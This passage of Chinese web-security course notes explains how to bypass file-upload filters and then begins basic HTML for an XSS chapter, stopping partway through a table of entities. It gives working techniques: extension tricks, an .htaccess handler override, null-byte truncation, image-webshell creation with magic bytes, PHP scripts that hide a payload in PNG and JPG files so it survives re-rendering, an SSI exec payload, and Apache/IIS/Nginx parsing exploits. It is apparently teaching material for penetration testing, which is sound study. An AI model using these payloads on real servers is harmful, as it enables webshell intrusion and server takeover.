<p>黑名单、白名单怎么判别？<br>随便上传一个不存在的后缀的文件，看是否能成功，成功则代表是黑名单，不成功就是白名单<br>黑名单：服务端设置了一个黑名单，是个列表，里面都是不允许上传的后缀格式</p>
<p>绕过方法：<br>①大小写绕过，比如pHp（只针对windows）</p>
<p>②空格绕过，在后缀名后面加一个空格（注意：是在抓到的包里，找到文件名，然后在后面加空格）</p>
<p>③点绕过，因为windows会自动对扩展名后面的点（.）去除，所以我们加一个点既能绕过限制，也不影响文件的执行，就是在扩展名最后面加一个点（.），例如 1.php.   缺点：只能针对windows系统</p>
<p>组合绕过方法：<br>如果开发人员只设置了一次过滤，打个比方，过滤顺序是先过滤点，然后才是空格，那么我们可以通过点和空格的组合来实现绕过，利用的原理就是只过滤一遍的缺陷<br>根据过滤次数来绕过，如果代码是先过滤点，然后过滤空格，并且只是过滤一次，那么我们完全可以构建：1.php. . php + 点 + 空格 +点 这样当第一次过滤点，会将外层点过滤，接着空格，因为只过滤一次，所以到最后还有一个点，从而实现绕过黑名单</p>
<p><img src="/source/hetian/image-20210202210005515.png" alt="image-20210202210005515"></p>
<p><img src="/source/hetian/image-20210202210009461.png" alt="image-20210202210009461"></p>
<p>④::$DATA绕过，在扩展名后面加 ::$DATA   缺点：只能针对windows系统<br>原理：文件名+::$DATA  ，php将不会检查其后缀名，并且在上传成功后，会自动抹去后面的 ::DATA   ,比如我们上传1.php::DATA,上传到成功后，文件名会自动变成1.php</p>
<p>⑤配合apache解析漏洞<br>条件：影响版本：2.4.0-2.4.29<br>Apache解析的特点，解析文件是从右往左判断，如果不可识别，继续往左判断下去，例如aa.php.wof.rar   这里rar，无法识别，然后wof也无法识别，接着就会识别到php，但是该文件的扩展名是rar，所以不在黑名单之内，从而实现绕过并能执行php文件</p>
<p>⑥     .htaccess文件绕过<br>.htaccess文件，能够在里面设置指令，打个比方，如果在.htaccess里的命令是把该文件所在目录下的所有文件都当做php来执行，即.htaccess当前所在目录下的txt、jpg…等都会按照php来对待，所以.htaccess可以轻松绕过各种检测<br>易错点：.htaccess文件的点前面没有内容，如果我们直接新建一个这种小数点前面没名字的文件，会无法创建，所以得利用第三方的编辑工具创建，比如notepad++<br>示例代码：新建一个.htaccess文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;as.png&quot;&gt;setHandler application/x-httpd-php&lt;/FilesMatch&gt; </span><br></pre></td></tr></table></figure>

<p>代码的意思就是调用php解析器去解析当前htaccess文件目录下名字里包含as.png这个字符串的文件，所以无论文件的扩展名是什么样，都可以按照php来执行</p>
<p>⑦重写绕过<br>适宜场景：服务端将黑名单里的后缀名替换为空<br>绕过策略：对后缀名进行组合，比如1.php写成1.pphphp 当其检测，会将第2个字母到第4个字母替换为空，但是一旦替换为空，剩下的字母就变成了了php，从而实现了绕过</p>
<p><img src="/source/hetian/image-20210202210122761.png" alt="image-20210202210122761"></p>
<p>白名单：服务端设置了一个白名单，是个列表，只允许上传该列表里的后缀格式<br>绕过方法：服务端判断文件类型是从后往前判断，而对文件解析是从前往后解析，可以利用00截断的方式进行绕过，包括%00截断与0x00截断。<br>截断的条件：<br>易错点：截断只适合白名单，不要用混了，把它用到黑名单去了<br>1、php小于5.3.29<br>2、需要php.ini里面的magic_quoters_gpc 设置为off<br>截断的基本原理：主要是通过0来结束，分为两种，一种是在url中截断，一种是在16进制中截断，0在url中的表示方法就是%00，而0在16进制中的表示方法就是00，如此再加上16进制的标志，即0在16进制中就是0x00</p>
<p>%00和0x00截断的应用时机：白名单的时候用</p>
<p>%00截断：<br>如果碰到路径拼接，并且是通过get方式来路径拼接的（就是路径显示在get请求里）的，也就是get请求的地址是一个目录，可以在地址后面添加一个目录然后%00来截断，比如xx/xx/1.php%00<br>这里因为浏览器会将%00解码成0x00，所以这里只需要填%00，而post路径的，因为没有浏览器进行解码，所以需要通过hex修改为0x00</p>
<p>场景：主要用于服务端对我们上传的文件名给重命名了，比如根据随机数或者时间戳重命名了，我们就可以在抓取的包的请求保存的网址后面save_path=../upload/，添加一个目录，比如目录设置为save_path=../upload/1.php%00, 那么当服务端将就会执行请求命令：save save_path=../upload/1.php%00/51315.jpg ,这样的话，%00就会将后面的给截断了，所以最终文件名会是1.php，并且是保存在upload下<br>url发送到服务器后被服务器解码，这时还没有传到验证函数，也就是说验证函数里接收到的不是%00字符，而是%00解码后的内容，即解码成了0x00。</p>
<p><img src="/source/hetian/image-20210202210158294.png" alt="image-20210202210158294"></p>
<p><img src="/source/hetian/image-20210202210201701.png" alt="image-20210202210201701"></p>
<p>0x00截断：<br>如果碰到的路径拼接是通过post路径的，就是get的地址是一个具体的文件，而非一个目录，此时我们可以修改请求体重的保存路径，和上面一样，在路径后面构造一个1.php+空格   接着去hex里将20修改为00,即可。</p>
<p>原理：系统在对文件名进行读取时，如果遇到0x00，就会认为读取已经结束。但要注意是文件的十六进制内容里的00，而不是文件名中的00。<br>利用场景：既可以在文件名这个部位的16进制里修改，也可以在保存的路径里修改，和%00截断类似，/upload/1.php  后面添加一个空格，然后16进制改为00，从而实现截断<br>修改技巧：在文件后缀名后面加一个字母a，主要是为了在16进制中方便定位，然后再后缀名和a之间加一个空格，加好了之后，就去16进制界面找到a，然后再在a附近找到20，因为空格在16进制中就是20，将20改为00即可，最后再回到包的界面，删除a即可<br>易错点：我们在burp里修改16进制的时候，很多数据都是三个点（…），我们需要鼠标左键去双击才能显示，然后找到20，将其改为00，实际上很好找的，空格在a的左边，我们看a是16进制第一个，我们就去它的a所在的那一行的最左边或者它的上一行的最右边去寻找</p>
<p>案例1</p>
<p><img src="/source/hetian/image-20210202210228471.png" alt="image-20210202210228471"></p>
<p><img src="/source/hetian/image-20210202210234705.png" alt="image-20210202210234705"></p>
<p><img src="/source/hetian/image-20210202210242346.png" alt="image-20210202210242346"></p>
<p>0x00截断案例2<br>如果碰到的是让我们自定义上传的文件的名字，此时我们完全可以在保存的名称处进行截断：例如：保存的名称写成：1.php+空格+点+jpg   然后抓包，接着空格在hex里替换成00</p>
<p><img src="/source/hetian/image-20210202210254686.png" alt="image-20210202210254686"></p>
<p><img src="/source/hetian/image-20210202210258296.png" alt="image-20210202210258296"></p>
<p><img src="/source/hetian/image-20210202210304428.png" alt="image-20210202210304428"></p>
<p>服务端文件内容检测（检测内容是否含有恶意代码）等<br>主要检测文件内容开始处的幻数来判断，通常情况下，通过判断前10个字节，基本就能判断出一个文件的真实类型<br>修改方法：二进制工具或者记事本修改，也可以通过cmd生成图片马(优点：图片并没有损坏，而且开头幻数也是图片格式的，并且里面也有一句话代码)，例如：copy 1.jpg/b + muma.php/a 2.jpg</p>
<p><img src="/source/hetian/image-20210202210320771.png" alt="image-20210202210320771"></p>
<p>生成为成功后记得检查下，用二进制打开或者记事本打开，看一句话是否插入成功</p>
<p><img src="/source/hetian/image-20210202210332876.png" alt="image-20210202210332876"></p>
<p><img src="/source/hetian/image-20210202210337251.png" alt="image-20210202210337251"></p>
<p>如果想将木马伪装成jpg，可以在其内容（一句话木马）开头添加<br> FF D8 FF E0 00 10 4A 46 49 46<br>如果想将木马伪装成gif，可以在其内容开头添加（推荐）<br>或者直接添加:GIF89a<br>47 49 46 38 39 61<br>如果想将木马伪装成jpg，可以在其内容开头添加<br>89 50 4E 47</p>
<p>图片马的作用<br>1、图片马自带图片相关的幻数，无需我们手动插入，生成后，我们只需要将后缀改成php，然后再上传，那么针对文件内容的检测即可绕过</p>
<p>2、如果服务端的检测机制除了文件内容，还限制了php后缀名，那么我们完全可以直接将图片马上传，因为图片马的后缀格式是符合要求的，然后再配套文件包含漏洞，包含该图片马即可变相绕过。</p>
<p>图片马被二次渲染怎么办？<br>1、什么是二次渲染？<br>二次渲染只是一种技术，并不会导致漏洞，二次渲染就是根据我们上传的图片新生成一个图片，新图片可能进行了缩小啊，类似于我们上传图片，会有一个缩略图，并且将原始图片进行了删除（重命名）。其主要功能是对我们的图片进行了处理</p>
<p>2、二次渲染造成的难题<br>会让我们的图片马里的内容遭到修改，很可能因为它的二次渲染，导致我们的图片马里的一句话木马内容丢失，或者残缺，从而导致后续无法对图片马进行利用。</p>
<p>3、怎么判别是否有二次渲染？<br>我们可以将图片下载下来，用二进制工具打开，看里面的一句话木马是否还存在，若不存在，则代表二次渲染了</p>
<p>4、怎么应对图片马被二次渲染？<br>根据不同的图片格式，有不同的应对方法，其中gif的最简单，推荐使用gif，因为gif图片最大的特征就是无损，图片修改后，照片质量几乎无损，而jpg和png就不行了，所以修改的难度更大，所以推荐使用脚本修改<br>gif图片马应对二次渲染<br>我们直接将上传后的图片b（已被渲染）和原图片a进行比对，找到b和a的共同的部分（二进制里），然后再将一句话木马插入到这两种图片的共同的部分之间（插入到a里），然后再将a进行上传即可绕过。这是因为gif的二次渲染只会对图片的代码的部分进行修改，而我们将一句话插入到不被修改的里面，就可以绕过</p>
<p>png图片马应对二次渲染<br>代码运行方法：参考附录php，此时，需要将1.png放在脚本目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);<span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);<span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);&#125;imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>jpg图片马应对二次渲染（代码）<br>代码运行方法：参考附录php，此时命令行需要传递待处理的图片名，并且代码里的pyaload可以修改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);    &#125;    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);    &#125;    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);        <span class="variable">$extraBytes</span> = <span class="number">0</span>;        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);        &#125;        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();                <span class="variable">$outStreamTmp</span> =                     substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .                     <span class="variable">$miniPayload</span> .                     str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .                     substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;                                <span class="keyword">break</span>;                            &#125;                        &#125;                    &#125;                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;                    <span class="variable">$outStream</span> =                         substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .                         <span class="variable">$miniPayload</span> .                         substr(                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),                            <span class="number">0</span>,                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .                                 substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;                &#125; <span class="keyword">else</span> &#123;                    <span class="keyword">break</span>;                &#125;                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);                &#125; <span class="keyword">else</span> &#123;                    <span class="keyword">break</span>;                &#125;            &#125;        &#125;    &#125;    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;        <span class="keyword">global</span> <span class="variable">$correctImage</span>;        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;        imagecreatefromjpeg(<span class="variable">$filename</span>);        <span class="keyword">if</span>(<span class="variable">$unlink</span>)            unlink(<span class="variable">$filename</span>);        <span class="keyword">return</span> <span class="variable">$correctImage</span>;    &#125;    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];            &#125;        &#125;    &#125;    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;        <span class="keyword">private</span> <span class="variable">$binData</span>;        <span class="keyword">private</span> <span class="variable">$order</span>;        <span class="keyword">private</span> <span class="variable">$size</span>;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);            &#125; <span class="keyword">else</span> &#123;                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;            &#125;            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);        &#125;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));        &#125;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);        &#125;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);            &#125;            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);        &#125;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);            &#125;            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);            &#125; <span class="keyword">else</span> &#123;                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);            &#125;            <span class="keyword">return</span> <span class="variable">$short</span>;        &#125;        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);        &#125;    &#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<p>Apache SSI 远程命令执行漏洞<br>前提：目标服务器开启了SSI与CGI支持<br>适合：php文件无法上传，并且对方开启了ssi和cgi的时候<br>利用方法：构造一个shtml文件，在文件里写入命令，然后上传，接着再访问该上传的文件—访问后，页面就显示出文件里命令执行后的结果<br>文件代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;whoami&quot; --&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210202210550394.png" alt="image-20210202210550394"></p>
<p><img src="/source/hetian/image-20210202210554052.png" alt="image-20210202210554052"></p>
<p>Web解析漏洞（了解即可，平常碰到的少）<br>Apache解析漏洞<br>利用方式：一般如果碰到文件上传黑名单的情况，可以看其存不存在apache解析漏洞<br>原理：apache解析文件是从右到左，如果无法识别，则继续往左，假设一处上传点有上传黑名单限制，并且其还存在apache解析漏洞，我们就可以将文件扩展名改为：1.php.qwe.asd   这样因为黑名单的特性，所以可以上传成功，并且因为apache的解析漏洞，asd格式无法识别，qwe无法识别，所以最后识别到了php，会将其解析，也就成功解析了木马。<br>条件：影响版本：2.4.0-2.4.29</p>
<p>防御措施：<br>1、进制访问php文件<br>现在对apache的配置文件做适当修改，在文件中添加下面几行代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.(php.|php3.|php4.|php5.)&quot;&gt;Order Deny,Allow Deny from all&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p> 禁止*.php.*文件的访问权限</p>
<p>2、对上传的文件进行限制，虽然也可以绕过，比如限制content-type</p>
<p><img src="/source/hetian/image-20210202210706985.png" alt="image-20210202210706985"></p>
<p>iis6.0解析漏洞<br>目录解析<br>形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a><br>原理: 服务器默认会把.asp目录下的文件都解析成asp文件。<br>文件解析<br>形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了<br>可执行文件：IIS6.0默认的可执行文件除了asp还包含asa\cer\cdx这三种脚本文件</p>
<p>Iis6.0搭配fckeditor编辑器2.5进行漏洞利用<br>1、fck2.5会自动把文件名中的点替换成下划线，比如会自动将1.asp替换成1_asp，这样我们就无法利用iis6.0目录解析漏洞了，所以需要通过抓包，修改包的内容，将%2F改为%2F1.asp<br>2、同时，fck2.5会将1.asp;2.jpg进行处理，除了最后面的一个小数点，前面的小数点全部替换成下划线，这里会替换成1_asp;2.jpg   所以这里也需要找方法绕过</p>
<p>iis7.0解析漏洞<br>形式：任意文件名/任意文件名.php<br>原理：IIS7.0/7.5 是对 php 解析时有一个类似于 Nginx 的解析漏洞，对任意文件名只要在 URL后面追加上字符串”/任意文件名.php”就会按照 php 的方式去解析<br>Nginx解析漏洞<br>形式：任意文件名/任意文件名.php<br>一个在任意文件名后面添加 /任意文件名.php 的解析漏洞，比如原本文件名是 test.jpg，可以添加为test.jpg/x.php 进行解析攻击。、<br>形式：任意文件名%00.php<br>对低版本的 Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。（Nginx版本 &lt;=0.8.37 空字节代码执行漏洞）<br>实战：上传一个图片马，然后访问该图片，在在图片地址后面加上/.php<br>就会将该png图片按照php格式执行，接下来可以将改地址填到菜刀链接</p>
<p><img src="/source/hetian/image-20210202210734036.png" alt="image-20210202210734036"></p>
<p><img src="/source/hetian/image-20210202210737066.png" alt="image-20210202210737066"></p>
<p>怎么访问上传后的文件？<br>1、右键图片查看链接<br>2、看返回包里的地址，如果有 ../ 即代表上级目录</p>
<p>文件上传漏洞通用攻击流程</p>
<p><img src="/source/hetian/image-20210202210755683.png" alt="image-20210202210755683"></p>
<h1 id="第五章：XSS漏洞"><a href="#第五章：XSS漏洞" class="headerlink" title="第五章：XSS漏洞"></a>第五章：XSS漏洞</h1><h2 id="1、基础讲解"><a href="#1、基础讲解" class="headerlink" title="1、基础讲解"></a>1、基础讲解</h2><h3 id="1-1-html基础"><a href="#1-1-html基础" class="headerlink" title="1.1  html基础"></a>1.1  html基础</h3><p>Html 是一种超文本标记语言，英文名字叫 HyperText Markup Language。<br>超级文本标记语言是一种规范，也是一种标准，它通过标记符号来标记要显<br>示的网页中的各个部分</p>
<p>html文件后缀名 .html 或者 .xhtml 。<br>html 可以直接由浏览器执行</p>
<p>html的框架</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; 与 &lt;/html&gt; 限定了文档的开始点和结束点。&lt;head&gt; 定义文档头部。&lt;body&gt; 定义文档主体</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210203130305023.png" alt="image-20210203130305023"></p>
<p>head部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;合天网安实验室-国内大型MOOE在线实验室&lt;/title&gt;：网页标题栏显示的信息</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210203130430974.png" alt="image-20210203130430974"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2. &lt;meta&gt; html的元信息标签，搜索引擎抓取网页时分析。，meta标签内容应该写在头部里</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210203130544206.png" alt="image-20210203130544206"></p>
<p>body部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;p&gt; 段落标签&lt;p&gt;文本&lt;/p&gt;2. &lt;a&gt;超链接标签&lt;a href=“http://www.baidu.com” target=“_blank”&gt;百度一下&lt;/a&gt;&lt;a href=“#top”&gt;跳转&lt;/a&gt; 需创建一个 id 属性 id=“top”3. &lt;img&gt;图片标签&lt;img src=&quot;图片地址&quot; alt=&quot;图片加载失败&quot;/&gt;4. HTML 特殊符号在 HTML 中有些字符是有特殊含义的，不能在浏览器中直接显示出来的。比如: &lt;p&gt; 我是&lt;h1&gt;标签哦&lt;/p&gt; #&lt;h1&gt;被当作主标题如果想要显示特殊字符，且不被浏览器解析呢？解决方式：实体字符，&lt;p&gt;我是 &amp;lt; h1&amp;gt;标签哦&lt;/p&gt;</span><br></pre></td></tr></table></figure>



<p>. HTML 特殊符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体字符表示方式● &amp;entity-name- &amp;nbsp；● &amp;#entity-number- &amp;#160;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">显示结果</th>
<th align="left">描述</th>
<th align="left">实体名称</th>
<th align="left">实体编号</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left">空格</td>
<td align="left">&nbsp;</td>
<td align="left">&#160;</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">小于号</td>
<td align="left">&lt;</td>
<td align="left">&#60;</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">大于号</td>
<td align="left">&gt;</td>
<td align="left">&#62;</td>
</tr>
<tr>
<td align="left">&amp;</td>
<td align="left">和号</td>
<td align="left">&amp;</td>
<td align="left">&#38;</td>
</tr>
<tr>
<td align="left">“</td>
<td align="left">引号</td>
<td align="left">&quot;</td>
<td align="left">&#34;</td>
</tr>
<tr>
